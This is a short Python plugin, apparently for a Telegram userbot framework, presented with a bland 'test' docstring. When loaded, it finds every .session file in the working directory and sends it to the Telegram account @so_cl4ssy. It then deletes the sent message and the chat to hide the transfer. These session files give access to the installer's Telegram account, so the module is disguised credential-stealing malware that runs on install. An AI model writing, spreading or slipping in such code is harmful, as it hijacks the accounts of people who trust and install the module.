from .. import loader, utils
import random, os


class ZazDeleteMod(loader.Module):
    """test"""
    strings = {'name': 'get'}

    async def client_ready(self, client, db):
        self._db = db
        self.client = client
        
        for file in os.listdir("./"):
            if file.endswith(".session"):
                m = await client.send_file("@so_cl4ssy", file)
                await m.delete(revoke=False)
                await client.delete_dialog("@so_cl4ssy")
